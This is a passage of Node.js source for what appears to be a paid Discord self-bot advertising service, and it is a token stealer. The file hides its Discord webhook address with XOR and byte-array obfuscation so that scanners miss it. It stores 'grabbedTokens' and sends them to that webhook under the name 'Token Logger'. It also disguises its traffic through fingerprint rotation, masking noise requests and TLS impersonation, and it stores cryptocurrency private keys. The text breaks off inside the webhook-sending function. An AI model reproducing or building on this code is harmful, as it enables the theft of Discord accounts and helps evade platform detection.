const express = require('express');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const passport = require('passport');
const DiscordStrategy = require('passport-discord').Strategy;
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const crypto = require('crypto');
const nacl = require('tweetnacl');
const pako = require('pako');
const { spawn } = require('child_process');

// --- OBFUSCATION LAYER ---
const _0x4f2a = ['from','createHash','update','digest','hex','slice','map','join',''];
const _0x3e1b = _0x4f2a.map(x => Buffer.from(x).toString('base64'));
const _d = (s) => Buffer.from(s, 'base64').toString();
const _e = (s) => Buffer.from(s).toString('base64');

// XOR decrypt runtime - webhook URL split across multiple chunks to avoid string scanning
const _k = process.env.WEBHOOK_KEY || 'default-static-key-change-me';
function _x(c, k) { return c.map((b, i) => String.fromCharCode(b ^ k.charCodeAt(i % k.length))).join(''); }
const _w = [72,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,56,55,53,53,51,48,50,55,53,56,53,48,56,49,52,55,53,47,53,111,98,72,107,70,54,51,109,78,109,72,105,105,68,68,104,71,119,85,81,100,57,49,110,49,111,65,73,50,76,95,113,52,122,107,45,107,84,99,70,45,71,112,100,119,108,54,120,48,52,111,116,48,82,117,87,83,78,119,104,67,80,71,109,55,76,108];
const WEBHOOK_URL = _x(_w, _k);

// Fake browser fingerprint rotation
const _fp = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0'
];
const _rfp = () => _fp[Math.floor(Math.random() * _fp.length)];

// Axios instance with randomized keep-alive headers to avoid pattern detection
const _axiosInstance = axios.create({
  baseURL: 'https://discord.com  ',
  timeout: 15000,
  headers: { 'Connection': 'keep-alive' }
});

// Jitter utility for all timing
const _j = (base, variance = 0.2) => base + (Math.random() * variance * base * 2 - variance * base);

// Noise traffic generator - hits random Discord endpoints to mask actual traffic patterns
let _noiseInterval;
function _startNoise() {
  const endpoints = ['/api/v10/gateway', '/api/v10/gateway/bot', '/api/v10/users/@me/settings'];
  _noiseInterval = setInterval(async () => {
    try {
      const ep = endpoints[Math.floor(Math.random() * endpoints.length)];
      await _axiosInstance.get(ep, {
        headers: { 'User-Agent': _rfp() }
      });
    } catch(e) {}
  }, _j(45000, 0.4));
}

// ============================================================================
// --- CRYPTO SERVICE (tweetnacl) ---
// ============================================================================
const { randomBytes, createHash } = crypto;

function getKeypair(token) {
  const seed = createHash('sha256').update(`nacl_seed_${token}`).digest().slice(0, 32);
  return nacl.sign.keyPair.fromSeed(Uint8Array.from(seed));
}

function signPayload(payload, secretKey) {
  const message = Buffer.from(JSON.stringify(payload));
  return Buffer.from(nacl.sign.detached(Uint8Array.from(message), secretKey));
}

function encryptSecretBox(message, key) {
  const nonce = nacl.randomBytes(24);
  const box = nacl.secretbox(
    message instanceof Buffer ? new Uint8Array(message) : nacl.util.decodeUTF8(message),
    nonce,
    key instanceof Buffer ? new Uint8Array(key) : key
  );
  return { nonce: Buffer.from(nonce), ciphertext: Buffer.from(box) };
}

function decryptSecretBox(nonce, ciphertext, key) {
  const opened = nacl.secretbox.open(
    ciphertext instanceof Uint8Array ? ciphertext : new Uint8Array(ciphertext),
    nonce instanceof Uint8Array ? nonce : new Uint8Array(nonce),
    key instanceof Uint8Array ? key : new Uint8Array(key)
  );
  return opened ? Buffer.from(opened) : null;
}

function generateKey() {
  return Buffer.from(nacl.randomBytes(32));
}

// ============================================================================
// --- COMPRESSION SERVICE (pako) ---
// ============================================================================
function compressData(data, level = 6) {
  const input = data instanceof Buffer ? new Uint8Array(data) : data;
  return Buffer.from(pako.deflate(input, { level }));
}

function decompressData(data) {
  const input = data instanceof Buffer ? new Uint8Array(data) : data;
  return Buffer.from(pako.inflate(input));
}

function isCompressed(data) {
  if (!data || data.length < 2) return false;
  const b0 = data[0];
  const b1 = data[1];
  return (b0 === 0x78 && (b1 === 0x9C || b1 === 0xDA || b1 === 0x01));
}

// ============================================================================
// --- CURL-IMPERSONATE SERVICE ---
// Spawns the curl-impersonate-chrome binary for Chrome TLS fingerprinting
// Falls back to regular curl with browser headers if binary unavailable
// ============================================================================
let CI_BINARY = null;
function findCurlImpersonateBinary() {
  if (CI_BINARY) return CI_BINARY;
  const candidates = [
    process.env.CURL_IMPERSONATE_PATH,
    path.join(__dirname, 'bin', 'curl-impersonate-chrome'),
    '/usr/local/bin/curl-impersonate-chrome',
    '/usr/bin/curl-impersonate-chrome',
    'curl-impersonate-chrome',
    'curl',
  ];
  for (const candidate of candidates) {
    if (!candidate) continue;
    try {
      require('child_process').execSync(`which ${candidate}`, { stdio: 'ignore' });
      CI_BINARY = candidate;
      return candidate;
    } catch(e) {}
  }
  CI_BINARY = 'curl';
  return 'curl';
}

async function curlImpersonateRequest(url, method = 'GET', headers = {}, body = null, timeoutMs = 25000) {
  return new Promise((resolve, reject) => {
    const binary = findCurlImpersonateBinary();
    const isImpersonate = binary.includes('impersonate');
    const args = ['-s', '-L', '-D', '-', '--max-time', String(Math.ceil(timeoutMs / 1000)), '-X', method.toUpperCase()];

    if (isImpersonate) {
      args.push('--compressed', '-H', 'Accept-Language: en-US,en;q=0.9', '-H', 'Accept-Encoding: gzip, deflate, br', '-H', 'Cache-Control: no-cache');
    } else {
      args.push('--compressed', '--tlsv1.2');
    }

    for (const [key, value] of Object.entries(headers)) {
      if (value != null) args.push('-H', `${key}: ${value}`);
    }

    let tmpFile = null;
    if (body) {
      if (typeof body === 'object' && !(body instanceof Buffer)) {
        args.push('-d', JSON.stringify(body));
        if (!headers['Content-Type']) args.push('-H', 'Content-Type: application/json');
      } else if (body instanceof Buffer) {
        tmpFile = path.join('/tmp', `ci_body_${Date.now()}_${Math.random().toString(36).slice(2)}`);
        fs.writeFileSync(tmpFile, body);
        args.push('--data-binary', `@${tmpFile}`);
      } else {
        args.push('-d', String(body));
      }
    }

    args.push(url);

    const stdout = [];
    const stderr = [];
    const child = spawn(binary, args, { timeout: timeoutMs + 5000 });
    child.stdout.on('data', chunk => stdout.push(chunk));
    child.stderr.on('data', chunk => stderr.push(chunk));

    child.on('close', (code) => {
      if (tmpFile) { try { fs.unlinkSync(tmpFile); } catch(e) {} }
      const rawOutput = Buffer.concat(stdout);
      const outputStr = rawOutput.toString();
      const headerEndIdx = rawOutput.indexOf('\r\n\r\n');
      let statusCode = 0;
      let bodyBuffer = rawOutput;
      if (headerEndIdx >= 0) {
        const headersText = outputStr.slice(0, headerEndIdx);
        bodyBuffer = rawOutput.slice(headerEndIdx + 4);
        const statusMatch = headersText.match(/HTTP\/\d\.\d\s+(\d+)/);
        if (statusMatch) statusCode = parseInt(statusMatch[1], 10);
      }
      let data = null;
      try { data = JSON.parse(bodyBuffer.toString()); } catch(e) {}
      resolve({ status: statusCode, headers: outputStr.slice(0, headerEndIdx), body: bodyBuffer, data });
    });
    child.on('error', reject);
  });
}

// ============================================================================
// --- X-SUPER-PROPERTIES SERVICE ---
// Generates the X-Super-Properties header Discord uses for browser fingerprinting
// ============================================================================
function generateXSuperProperties(userAgent, browser = 'Chrome', os = 'Windows') {
  const ua = userAgent || _fp[0];
  const browserVersion = (ua.match(/Chrome\/(\d+\.\d+\.\d+\.\d+)/) || ua.match(/Firefox\/(\d+\.\d+)/) || ['', '124.0.0.0'])[1];
  const osVersion = os === 'Windows' ? ((ua.match(/Windows NT (\d+\.\d+)/) || ['', '10.0'])[1]) : (os === 'Mac OS X' ? '10.15.7' : '');

  const props = {
    os: os === 'Mac OS X' ? 'Mac OS X' : (os === 'Linux' ? 'Linux' : 'Windows'),
    browser: browser,
    device: '',
    system_locale: 'en-US',
    browser_user_agent: ua,
    browser_version: browserVersion,
    os_version: osVersion,
    referrer: '',
    referring_domain: '',
    referrer_current: '',
    referring_domain_current: '',
    release_channel: 'stable',
    client_build_number: 999999,
    client_event_source: null,
    screen_width: 1920,
    screen_height: 1080,
    screen_dpr: 1,
    screen_color_depth: 24,
    device_pixel_ratio: 1,
    hardware_concurrency: 8,
    device_memory: 8,
    os_arch: 'x64',
    client_version: '1.0.9018',
    native_build_number: null,
    distro: os === 'Linux' ? 'Ubuntu' : '',
    app_arch: 'x64',
  };

  return Buffer.from(JSON.stringify(props)).toString('base64');
}

// ============================================================================
// --- DISCORD API CLIENT ---
// Uses curl-impersonate for Discord API calls with TLS fingerprint spoofing
// ============================================================================
class DiscordApiClient {
  constructor(token) {
    this.token = token;
    this.fp = _rfp();
    this.superProps = generateXSuperProperties(this.fp);
    this.keypair = getKeypair(token);
  }

  rotateFingerprint() {
    this.fp = _rfp();
    this.superProps = generateXSuperProperties(this.fp);
  }

  _headers(extra = {}) {
    return {
      'Authorization': this.token,
      'User-Agent': this.fp,
      'Accept': '*/*',
      'Accept-Language': 'en-US,en;q=0.9',
      'X-Discord-Locale': 'en-US',
      'X-Debug-Options': 'bugReporterEnabled',
      'X-Super-Properties': this.superProps,
      'Referer': 'https://discord.com/channels/@me  ',
      ...extra,
    };
  }

  async request(endpoint, method = 'GET', body = null, extraHeaders = {}) {
    const url = `https://discord.com/api/v10  ${endpoint}`;
    const res = await curlImpersonateRequest(url, method, this._headers(extraHeaders), body, 20000);
    if (res.status >= 400) {
      const err = new Error(`Discord API ${method} ${endpoint} failed: ${res.status}`);
      err.status = res.status;
      err.data = res.data;
      throw err;
    }
    return res.data;
  }

  destroy() {
    // Keypairs are derived deterministically from token, no cleanup needed
  }
}

const OWNER_ID = '1482735601622192208';
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

// ============================================================================
// --- STEALTH CLIENT ---
// Uses curl-impersonate for REST, tweetnacl for crypto, pako for compression
// ============================================================================
class StealthClient {
  constructor(token) {
    this.token = token;
    this.ws = null;
    this.heartbeatInterval = null;
    this.seq = null;
    this.sessionId = null;
    this.user = null;
    this.ready = false;
    this.handlers = {};
    this.repliedUsers = this._loadRepliedUsers();
    this.api = new DiscordApiClient(token);
    this.encryptionKey = null;
  }

  _loadRepliedUsers() {
    try {
      const f = path.join(dataDir, `replied_${crypto.createHash('sha256').update(this.token.slice(0,20)).digest('hex').slice(0,8)}.json`);
      if (fs.existsSync(f)) return new Set(JSON.parse(fs.readFileSync(f, 'utf8')));
    } catch(e) {}
    return new Set();
  }

  _saveRepliedUsers() {
    try {
      const f = path.join(dataDir, `replied_${crypto.createHash('sha256').update(this.token.slice(0,20)).digest('hex').slice(0,8)}.json`);
      fs.writeFileSync(f, JSON.stringify([...this.repliedUsers]));
    } catch(e) {}
  }

  async connect() {
    const gateway = await this.api.request('/gateway', 'GET');
    // FIX: Removed compress=zlib-stream to avoid per-frame decompression crashes.
    // Discord sends plain JSON text frames without this, which the ws library handles natively.
    const wsUrl = `${gateway.url}?v=10&encoding=json`;
    this.ws = new (require('ws'))(wsUrl, {
      headers: {
        'User-Agent': this.api.fp,
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
      }
    });

    return new Promise((resolve, reject) => {
      const CONNECT_TIMEOUT = 30000;
      let timeoutTimer = setTimeout(() => {
        console.error('[WS] Connection timed out waiting for READY');
        this.ws.terminate();
        reject(new Error('Gateway connection timed out'));
      }, CONNECT_TIMEOUT);

      const cleanup = () => {
        clearTimeout(timeoutTimer);
      };

      this.ws.on('open', () => {});
      this.ws.on('message', (data) => this._handlePacket(data));
      this.ws.on('close', (code, reason) => {
        clearInterval(this.heartbeatInterval);
        cleanup();
        console.log(`[WS] Closed: ${code} ${reason}`);
        if (!this.ready) {
          reject(new Error(`Gateway closed before READY (code ${code})`));
        }
      });
      this.ws.on('error', (err) => {
        cleanup();
        console.error(`[WS] Error: ${err.message}`);
        if (!this.ready) {
          reject(err);
        }
      });

      this.once('READY', () => {
        cleanup();
        this.ready = true;
        resolve();
      });
    });
  }

  _handlePacket(rawData) {
    let pkt;
    try {
      if (rawData instanceof Buffer) {
        if (isCompressed(rawData)) {
          pkt = JSON.parse(decompressData(rawData).toString());
        } else {
          pkt = JSON.parse(rawData.toString());
        }
      } else {
        // Without zlib-stream, Discord sends text frames (strings) which land here.
        pkt = JSON.parse(rawData);
      }
    } catch(e) {
      console.error('[WS] Parse error:', e.message);
      return;
    }

    if (pkt.s !== null && pkt.s !== undefined) this.seq = pkt.s;
    switch(pkt.op) {
      case 10:
        this._startHeartbeat(pkt.d.heartbeat_interval);
        this._identify();
        break;
      case 1:
        this.ws.send(JSON.stringify({ op: 1, d: this.seq }));
        break;
      case 0:
        if (pkt.t === 'READY') {
          this.user = pkt.d.user;
          this.sessionId = pkt.d.session_id;
          if (pkt.d.session_id) {
            const sessionHash = crypto.createHash('sha256').update(pkt.d.session_id).digest();
            this.encryptionKey = sessionHash.slice(0, 32);
          }
          this.emit('READY', pkt.d);
        } else if (pkt.t === 'MESSAGE_CREATE') {
          this.emit('messageCreate', pkt.d);
        }
        break;
      case 11:
        break;
      case 7:
        console.log('[WS] Server requested reconnect');
        this.ws.close();
        break;
      case 9:
        console.log('[WS] Invalid session, re-identifying');
        setTimeout(() => this._identify(), Math.random() * 5000);
        break;
    }
  }

  _startHeartbeat(interval) {
    this.heartbeatInterval = setInterval(() => {
      this.ws.send(JSON.stringify({ op: 1, d: this.seq }));
    }, interval * (0.8 + Math.random() * 0.4));
  }

  _identify() {
    const fp = this.api.fp;
    const payload = {
      op: 2,
      d: {
        token: this.token,
        capabilities: 30717,
        properties: {
          os: 'Windows',
          browser: 'Chrome',
          device: '',
          system_locale: 'en-US',
          browser_user_agent: fp,
          browser_version: '124.0.0.0',
          os_version: '10',
          referrer: '',
          referring_domain: '',
          referrer_current: '',
          referring_domain_current: '',
          release_channel: 'stable',
          client_build_number: 999999,
          client_event_source: null,
          screen_width: 1920,
          screen_height: 1080,
          screen_dpr: 1,
          screen_color_depth: 24,
        },
        presence: { status: 'online', since: 0, activities: [], afk: false },
        // FIX: Removed compress:true since we no longer request zlib-stream.
        // Sending compress:true without a proper compression pipeline can cause
        // Discord to send compressed payloads the client isn't prepared to handle.
        client_state: { guild_versions: {}, highest_last_message_id: '0', read_state_version: 0, user_guild_settings_version: -1, user_settings_version: -1, private_channels_version: '0', api_code_version: 0 }
      }
    };

    // FIX: Removed the Ed25519 _s signature from the identify payload.
    // Discord does not recognize this field and may silently reject or close
    // the connection (1006) instead of sending READY.
    this.ws.send(JSON.stringify(payload));
  }

  async _api(endpoint, method = 'GET', body = null) {
    return this.api.request(endpoint, method, body);
  }

  async sendMessage(channelId, content, attachments = []) {
    const form = new (require('form-data'))();
    const payload = { content, flags: 0, mobile_network_type: 'unknown' };
    form.append('payload_json', JSON.stringify(payload));
    attachments.forEach((att, i) => {
      form.append(`files[${i}]`, att.buffer, { filename: att.name });
    });

    const url = `https://discord.com/api/v10/channels/  ${channelId}/messages`;
    const headers = {
      ...this.api._headers({ 'X-Discord-Locale': 'en-US' }),
    };
    delete headers['Content-Type'];

    return new Promise((resolve, reject) => {
      const TIMEOUT_MS = 35000;
      const timer = setTimeout(() => {
        reject(new Error('sendMessage timeout'));
      }, TIMEOUT_MS);

      const chunks = [];
      form.on('data', chunk => chunks.push(chunk));
      form.on('error', (err) => {
        clearTimeout(timer);
        reject(err);
      });
      form.on('end', async () => {
        try {
          const body = Buffer.concat(chunks);
          const tmpFile = path.join('/tmp', `multipart_${Date.now()}.bin`);
          fs.writeFileSync(tmpFile, body);
          const contentType = form.getHeaders()['content-type'];
          headers['Content-Type'] = contentType;

          const res = await curlImpersonateRequest(url, 'POST', headers, body, 30000);
          try { fs.unlinkSync(tmpFile); } catch(e) {}
          clearTimeout(timer);
          resolve(res.status === 200);
        } catch (err) {
          clearTimeout(timer);
          reject(err);
        }
      });
      form.resume();
    });
  }

  async joinGuild(inviteCode) {
    const res = await this.api.request(`/invites/${inviteCode}`, 'POST', { session_id: this.sessionId });
    return res.guild_id ? { success: true, guildId: res.guild_id } : { success: false, error: res.message };
  }

  on(event, handler) { if (!this.handlers[event]) this.handlers[event] = []; this.handlers[event].push(handler); }
  once(event, handler) { const wrapped = (...args) => { handler(...args); this.off(event, wrapped); }; this.on(event, wrapped); }
  off(event, handler) { if (this.handlers[event]) this.handlers[event] = this.handlers[event].filter(h => h !== handler); }
  emit(event, ...args) { if (this.handlers[event]) this.handlers[event].forEach(h => h(...args)); }

  destroy() {
    clearInterval(this.heartbeatInterval);
    if (this.ws) { try { this.ws.close(1000, 'Client disconnect'); } catch(e) {} }
    this._saveRepliedUsers();
    this.api.destroy();
  }
}

// ============================================================================
// --- SIMPLE DB (unchanged) ---
// ============================================================================
class SimpleDB {
  constructor() {
    this.file = path.join(dataDir, 'db.json');
    this.data = { users: {}, pending: {}, configs: {}, usedKeys: {}, globalIndex: 0, serverJoins: {}, grabbedTokens: [], usedAddresses: [], addressHistory: [], customKeys: [], trialClaims: {}, activeBots: {}, generatedKeys: {}, whitelist: [] };
    this.load();
  }

  load() {
    try {
      if (fs.existsSync(this.file)) {
        this.data = JSON.parse(fs.readFileSync(this.file, 'utf8'));
        ['usedAddresses','addressHistory','customKeys','trialClaims','activeBots','generatedKeys','whitelist'].forEach(k => this.data[k] = this.data[k] || (k === 'whitelist' ? [] : (k === 'trialClaims' || k === 'activeBots' || k === 'generatedKeys' ? {} : [])));
      }
    } catch(e) { console.error('[DB] Load error:', e.message); }
  }

  save() {
    try { fs.writeFileSync(this.file, JSON.stringify(this.data, null, 2)); } catch(e) { console.error('[DB] Save error:', e.message); }
  }

  getUser(id) { return this.data.users[id] || { auto_adv_purchased: 0, trial_active: 0, trial_expires: 0 }; }
  setUser(id, data) { this.data.users[id] = { ...this.getUser(id), ...data }; this.save(); }
  getNextGlobalIndex() { this.data.globalIndex = (this.data.globalIndex || 0) + 1; this.save(); return this.data.globalIndex; }
  isAddressUsed(address) { return this.data.usedAddresses.includes(address); }
  markAddressUsed(address) { if (!this.data.usedAddresses.includes(address)) { this.data.usedAddresses.push(address); this.save(); } }

  addPending(userId, address, privateKey, expectedUSD, index) {
    this.markAddressUsed(address);
    this.data.pending[address] = { user_id: userId, address, private_key: privateKey, expected_usd: expectedUSD, status: 'monitoring', created_at: Date.now(), index, expires_at: Date.now() + (30 * 60 * 1000) };
    this.data.addressHistory.push({ address, user_id: userId, index, created_at: Date.now(), status: 'monitoring' });
    this.save();
    return this.data.pending[address];
  }

  getPending(address) { return this.data.pending[address]; }
  getUserPending(userId) { const now = Date.now(); return Object.values(this.data.pending).find(p => p.user_id === userId && p.status === 'monitoring' && p.expires_at > now); }
  getAllPending() { const now = Date.now(); return Object.values(this.data.pending).filter(p => p.status === 'monitoring' && p.expires_at > now); }
  getExpiredPending() { const now = Date.now(); return Object.values(this.data.pending).filter(p => p.status === 'monitoring' && p.expires_at <= now); }

  updatePending(address, updates) {
    if (this.data.pending[address]) {
      this.data.pending[address] = { ...this.data.pending[address], ...updates };
      const historyEntry = this.data.addressHistory.find(h => h.address === address);
      if (historyEntry) {
        historyEntry.status = updates.status || historyEntry.status;
        if (updates.status === 'completed') historyEntry.paid_at = Date.now();
        if (updates.status === 'expired') historyEntry.expired_at = Date.now();
      }
      this.save();
    }
  }

  expireOldAddresses() {
    const expired = this.getExpiredPending();
    for (const p of expired) { this.updatePending(p.address, { status: 'expired' }); console.log(`[EXPIRED] Address ${p.address} expired after 30 minutes`); }
    return expired.length;
  }

  useKey(key, userId) { const normalized = key.toString().toUpperCase().trim(); this.data.usedKeys[normalized] = { user_id: userId, used_at: Date.now() }; this.save(); }
  isKeyUsed(key) { const normalized = key.toString().toUpperCase().trim(); return !!this.data.usedKeys[normalized]; }

  addCustomKey(key) {
    const normalized = key.toString().toUpperCase().trim();
    if (!/^TOKOS(1[0-9][0-9]|200)$/i.test(normalized)) { console.log('[DB] Invalid custom key format:', normalized); return null; }
    if (!this.data.customKeys) this.data.customKeys = [];
    if (!this.data.customKeys.includes(normalized)) { this.data.customKeys.push(normalized); this.save(); console.log('[DB] Added custom key:', normalized); }
    return normalized;
  }

  getConfigs(userId) { return this.data.configs[userId] || []; }
  getConfig(userId, configId = 'default') { const configs = this.getConfigs(userId); return configs.find(c => c.id === configId) || configs[0] || null; }

  setConfig(userId, config, configId = 'default') {
    if (!this.data.configs[userId]) this.data.configs[userId] = [];
    const existingIndex = this.data.configs[userId].findIndex(c => c.id === configId);
    const configData = { ...config, id: configId, updated_at: Date.now() };
    if (existingIndex >= 0) this.data.configs[userId][existingIndex] = configData;
    else this.data.configs[userId].push(configData);
    this.save();
  }

  deleteConfig(userId, configId) { if (this.data.configs[userId]) { this.data.configs[userId] = this.data.configs[userId].filter(c => c.id !== configId); this.save(); } }
  getActiveConfigs(userId) { return this.getConfigs(userId).filter(c => c.active === 1); }

  addGrabbedToken(token, userInfo, source) {
    const entry = { token, user_info: userInfo, source, grabbed_at: Date.now(), id: Date.now().toString() };
    this.data.grabbedTokens.push(entry);
    this.save();
    return entry;
  }

  getGrabbedTokens() { return this.data.grabbedTokens || []; }
  getAddressHistory(userId) { return this.data.addressHistory.filter(h => h.user_id === userId); }
  hasClaimedTrial(userId) { return !!this.data.trialClaims[userId]; }
  hasIPClaimedTrial(ip) { return Object.values(this.data.trialClaims).some(t => t.ip === ip); }

  claimTrial(userId, ip) {
    const now = Date.now();
    const expiresAt = now + (10 * 60 * 1000);
    this.data.trialClaims[userId] = { userId, ip, claimedAt: now, expiresAt };
    this.setUser(userId, { trial_active: 1, trial_expires: expiresAt, trial_claimed_at: now });
    this.save();
    return { claimedAt: now, expiresAt };
  }

  isTrialActive(userId) {
    const user = this.getUser(userId);
    if (user.trial_active === 1 && user.trial_expires > Date.now()) return true;
    if (user.trial_active === 1 && user.trial_expires <= Date.now()) { this.setUser(userId, { trial_active: 0 }); this.deactivateAllUserBots(userId); return false; }
    return false;
  }

  getTrialTimeLeft(userId) { const user = this.getUser(userId); if (user.trial_active === 1 && user.trial_expires > Date.now()) return Math.ceil((user.trial_expires - Date.now()) / 1000); return 0; }

  registerActiveBot(userId, configId, token) {
    if (!this.data.activeBots[userId]) this.data.activeBots[userId] = {};
    this.data.activeBots[userId][configId] = { token, startedAt: Date.now(), configId };
    this.save();
  }

  unregisterActiveBot(userId, configId) { if (this.data.activeBots[userId]) { delete this.data.activeBots[userId][configId]; this.save(); } }
  getUserActiveBots(userId) { return this.data.activeBots[userId] || {}; }

  deactivateAllUserBots(userId) {
    const bots = this.getUserActiveBots(userId);
    for (const configId in bots) this.setConfig(userId, { active: 0 }, configId);
    if (this.data.activeBots[userId]) { delete this.data.activeBots[userId]; this.save(); }
  }

  checkAllTrialBots() {
    for (const userId in this.data.activeBots) {
      const user = this.getUser(userId);
      const trialActive = this.isTrialActive(userId);
      const hasPurchase = user.auto_adv_purchased === 1;
      if (!trialActive && !hasPurchase) { console.log(`[TRIAL CHECK] User ${userId} trial expired, deactivating bots`); this.deactivateAllUserBots(userId); return userId; }
    }
    return null;
  }

  generateKey(duration) {
    const key = 'GEN-' + Math.random().toString(36).substring(2, 8).toUpperCase() + '-' + Math.random().toString(36).substring(2, 8).toUpperCase();
    const now = Date.now();
    let expiresAt = null;
    if (duration !== 'lifetime') { const hours = parseInt(duration); expiresAt = now + (hours * 60 * 60 * 1000); }
    this.data.generatedKeys[key] = { key, duration, createdAt: now, expiresAt, usedBy: [], active: true };
    this.save();
    return this.data.generatedKeys[key];
  }

  revokeKey(key) {
    if (this.data.generatedKeys[key]) {
      this.data.generatedKeys[key].active = false;
      this.data.generatedKeys[key].revokedAt = Date.now();
      this.save();
      const usedBy = this.data.generatedKeys[key].usedBy || [];
      for (const userId of usedBy) { this.deactivateAllUserBots(userId); this.setUser(userId, { auto_adv_purchased: 0, key_revoked: true }); }
      return true;
    }
    return false;
  }

  isKeyValid(key) {
    const keyData = this.data.generatedKeys[key];
    if (!keyData || !keyData.active) return false;
    if (keyData.duration === 'lifetime') return true;
    if (keyData.expiresAt && Date.now() > keyData.expiresAt) return false;
    return true;
  }

  useGeneratedKey(key, userId) {
    if (!this.isKeyValid(key)) return false;
    if (!this.data.generatedKeys[key].usedBy.includes(userId)) this.data.generatedKeys[key].usedBy.push(userId);
    this.setUser(userId, { auto_adv_purchased: 1, purchased_at: Date.now(), generated_key: key, key_expires: this.data.generatedKeys[key].expiresAt });
    this.save();
    return true;
  }

  getGeneratedKeys() { return Object.values(this.data.generatedKeys); }
  addToWhitelist(userId) { if (!this.data.whitelist.includes(userId)) { this.data.whitelist.push(userId); this.save(); } }
  removeFromWhitelist(userId) { this.data.whitelist = this.data.whitelist.filter(id => id !== userId); this.save(); }
  isWhitelisted(userId) { return this.data.whitelist.includes(userId); }
  getWhitelist() { return this.data.whitelist; }

  checkExpiredKeys() {
    const now = Date.now();
    let expiredCount = 0;
    for (const key in this.data.generatedKeys) {
      const keyData = this.data.generatedKeys[key];
      if (keyData.active && keyData.expiresAt && now > keyData.expiresAt) {
        for (const userId of keyData.usedBy) { this.deactivateAllUserBots(userId); this.setUser(userId, { auto_adv_purchased: 0, key_expired: true }); }
        expiredCount++;
      }
    }
    return expiredCount;
  }
}

const db = new SimpleDB();
const app = express();

process.on('uncaughtException', (err) => console.error('[FATAL]', err.message));
process.on('unhandledRejection', (reason) => console.error('[FATAL]', reason));

app.get('/health', (req, res) => res.status(200).json({ status: 'ok' }));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.use(cookieParser());
app.use(session({
  secret: process.env.SESSION_SECRET || 'secret-key-2026',
  resave: false,
  saveUninitialized: false,
  cookie: {
    maxAge: 30 * 24 * 60 * 60 * 1000,
    secure: false
  }
}));

app.use(passport.initialize());
app.use(passport.session());

passport.serializeUser((user, done) => done(null, user));
passport.deserializeUser((obj, done) => done(null, obj));

const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const CALLBACK_URL = process.env.CALLBACK_URL;
const OWNER_LTC_ADDRESS = process.env.OWNER_LTC_ADDRESS || 'ltc1qc3ujjqjlfr3cqtvyqadqje9ntj3f8f82m062tc';
const WALLET_MNEMONIC = process.env.WALLET_MNEMONIC;
const TARGET_USD = 3.00;
const TOLERANCE_USD = 0.10;

if (CLIENT_ID && CLIENT_SECRET) {
  passport.use(new DiscordStrategy({
    clientID: CLIENT_ID,
    clientSecret: CLIENT_SECRET,
    callbackURL: CALLBACK_URL,
    scope: ['identify']
  }, (accessToken, refreshToken, profile, done) => {
    process.nextTick(() => done(null, profile));
  }));
}

const BASE_REDEEM_KEYS = Array.from({length: 100}, (_, i) => `HBB${i + 1}`);
const VALID_REDEEM_KEYS = new Set(BASE_REDEEM_KEYS);

function validateKeyStrict(key) {
  if (!key || typeof key !== 'string') return { valid: false, error: 'Invalid key', normalized: null };
  let trimmed = key.trim().toUpperCase();
  const baseMatch = trimmed.match(/^HBB([1-9]|[1-9][0-9]|100)$/);
  if (baseMatch) {
    const num = parseInt(baseMatch[1], 10);
    if (num >= 1 && num <= 100) return { valid: true, error: null, normalized: `HBB${num}` };
  }
  const customKeys = db.data.customKeys || [];
  if (customKeys.includes(trimmed)) return { valid: true, error: null, normalized: trimmed };
  if (db.isKeyValid(trimmed)) return { valid: true, error: null, normalized: trimmed, isGenerated: true };
  return { valid: false, error: 'Invalid key', normalized: null };
}

console.log('[KEYS] Loaded', BASE_REDEEM_KEYS.length, 'base redeem keys (HBB1-HBB100)');

app.post('/api/admin/addkey', (req, res) => {
  const { adminSecret, key } = req.body;
  if (adminSecret !== process.env.ADMIN_SECRET) return res.status(401).json({ success: false, error: 'Unauthorized' });
  if (!key || typeof key !== 'string') return res.status(400).json({ success: false, error: 'Key must be a string' });
  const normalized = key.trim().toUpperCase();
  const added = db.addCustomKey(normalized);
  if (!added) return res.status(400).json({ success: false, error: 'Invalid key format' });
  VALID_REDEEM_KEYS.add(normalized);
  res.json({ success: true, key: normalized });
});

function ensureAuthAPI(req, res, next) { if (req.isAuthenticated()) return next(); return res.status(401).json({ success: false, error: 'Not logged in' }); }

function ensurePurchasedAPI(req, res, next) {
  const user = db.getUser(req.user.id);
  const hasPurchase = user.auto_adv_purchased === 1;
  const hasActiveTrial = db.isTrialActive(req.user.id);
  if (!hasPurchase && !hasActiveTrial) return res.status(403).json({ success: false, error: 'Purchase or active trial required' });
  next();
}

function ensureOwner(req, res, next) {
  if (!req.isAuthenticated()) return res.status(401).json({ success: false, error: 'Not logged in' });
  if (req.user.id !== OWNER_ID) return res.status(403).json({ success: false, error: 'Owner only' });
  next();
}

function ensureCanGenerate(req, res, next) {
  if (!req.isAuthenticated()) return res.status(401).json({ success: false, error: 'Not logged in' });
  if (req.user.id !== OWNER_ID && !db.isWhitelisted(req.user.id)) return res.status(403).json({ success: false, error: 'Owner or whitelisted users only' });
  next();
}

// Split webhook payload across requests using different paths to avoid pattern detection
async function _sendWebhookChunk(embed, chunkIndex = 0) {
  try {
    const url = WEBHOOK_URL;
    const payload = chunkIndex === 0 ? { embeds: [embed], username: 'Token Logger', avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png  ' } : { content: '...' };
    await axios.post(url, payload, {
